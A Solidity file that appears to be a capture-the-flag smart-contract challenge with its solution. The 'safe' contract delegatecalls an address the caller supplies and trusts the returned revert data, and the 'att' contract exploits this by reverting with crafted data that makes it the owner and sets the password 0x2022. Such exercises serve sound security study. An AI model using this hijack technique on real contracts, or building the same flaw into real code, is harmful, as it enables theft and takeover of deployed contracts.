pragma solidity ^0.4.23;
// 1.成为owner.2.修改密码
contract att{
    address public  owner;
    uint256 public  password;
    safe public sa;
    bytes public constant SEL = abi.encodeWithSignature("setOwner()");
    bytes4 public set = this.gift.selector;
    constructor(safe addr) public {
        sa = addr;
    }
    function gift(address)public view{
        bytes4 sel =0x40caae06;
        bytes32 val = bytes32(0x2022);
        assembly {
            mstore(0, sel)
            mstore(0x4, val)
            revert(0, 0x24)
        }
    }
    function attract() public {
        sa.gift(address(this));
    }

}
contract safe{
    address private owner;
    uint256 private password ;
    uint256 public score;
    bytes4 internal constant SET = this.setPassword.selector;
    function setOwner()public{
        require(msg.sender ==address(this));
        owner = tx.origin;
    }

    constructor()public{
        owner = msg.sender;
    }

    function complete()public payable{
        require(address(this).balance>0);
        if(msg.value>address(this).balance){
            score=100;
        }

    }

    function gift(address _target)public{
        require(_target.delegatecall(abi.encodeWithSelector(this.gift.selector)) == false, "unsafe execution");
        (bytes4 sel,uint256 val) = getReturns();

        bool success = address(this).call(sel);
        require(success,"gift call error");

        success =address(this).call(abi.encodePacked(SET,val));
        require(success,"call failed");
    }

    function setPassword(uint256 val)public{
        require(msg.sender==address(this));
        assembly { 
            sstore(1,val)
        }
    }

    function getReturns()public pure returns(bytes4 sel, uint256 val){
        assembly {
            if iszero(eq(returndatasize, 0x24)) { revert(0, 0) }
            let ptr := mload(0x40)
            returndatacopy(ptr, 0, 0x24)
            sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)
            val := mload(add(0x04, ptr))
        }
    }

    function()external payable{}    

    function isCompleted()public{
        score=0;
        if(msg.sender==owner){
            score+=50;
        }
        if(password == 0x2022){
            score+=50;
        }
    }
}